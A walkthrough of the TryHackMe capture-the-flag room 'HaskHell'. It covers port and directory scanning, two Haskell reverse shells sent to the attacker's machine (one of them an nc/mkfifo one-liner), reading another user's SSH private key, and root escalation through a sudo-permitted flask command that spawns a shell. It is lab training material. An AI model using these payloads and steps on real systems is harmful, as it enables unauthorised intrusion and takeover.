# HaskHell

**Room Link:** [https://tryhackme.com/room/haskhell](https://tryhackme.com/room/haskhell)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

### TCP/5001 - HTTP

Nothing really found, the pages listed are all broken links

**Kali**

```
gobuster dir -u http://$VICTIM:5001 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```







<figure><img src="../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

**test.hs**

```
import System.Info

main = do
    print os
    print arch
    print compilerName
    print compilerVersion
```

<figure><img src="../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1234
```

**revshell.hs**

```
import Network.Socket hiding (send, sendTo, recv, recvFrom)
import Network.Socket.ByteString (send, recv)
import qualified Data.ByteString.Char8 as B8
import System.Process
import System.IO
import Control.Exception

main = do
        client "$KALI" 1234

client :: String -> Int -> IO ()
client host port = withSocketsDo $ do
                addrInfo <- getAddrInfo Nothing (Just host) (Just $ show port)
                let serverAddr = head addrInfo
                sock <- socket (addrFamily serverAddr) Stream defaultProtocol
                connect sock (addrAddress serverAddr)
                (_, Just hout, _, _) <- createProcess (proc "whoami" []) {std_out = CreatePipe}
                resultOut <- hGetContents hout
                let resultMsg = B8.pack resultOut
                send sock resultMsg
                msgSender sock
                close sock

msgSender :: Socket -> IO ()
msgSender sock = do
  let msg = B8.pack ""
  send sock msg
  rMsg <- recv sock 1024
  let split_cmd = words (filter (/= '\n') (B8.unpack rMsg))
  result <- try' $ createProcess (proc (head split_cmd) (tail split_cmd)) {std_out = CreatePipe, std_err = CreatePipe}
  case result of 
    Left ex                            -> sendError sock ex
    Right (_, Just hout, Just herr, _) -> sendResult sock (Nothing, Just hout, Just herr, Nothing)
  msgSender sock
  
 
try' :: IO a -> IO (Either IOException a)
try' = try

sendError sock err = do
  let errorMsg = B8.pack ("Error:" ++ show err ++ "\n")
  send sock errorMsg
  
sendResult sock (_, Just hout, Just herr, _) = do
    resultOut <- hGetContents hout
    errorOut <- hGetContents herr
    let resultMsg = B8.pack resultOut
    let errorMsg = B8.pack errorOut
    send sock resultMsg
    send sock errorMsg
  
```

<figure><img src="../../.gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

**revshell2.hs**

```
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc $KALI 4242 >/tmp/f"
```

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

## Lateral movement

I had access to read user prof's id\_rsa key

**Victim**

```
cat /home/prof/.ssh/id_rsa
```

<figure><img src="../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

**Kali**

I copied pasted id\_rsa into a file on Kali

```
chmod 600 id_rsa
ssh prof@$VICTIM -i id_rsa
```

<figure><img src="../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

prof is able to run flask run as root

**Kali**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo 'import os; os.system("/bin/sh")' > flask.py
export FLASK_APP=flask.py
sudo /usr/bin/flask run
```

<figure><img src="../../.gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>







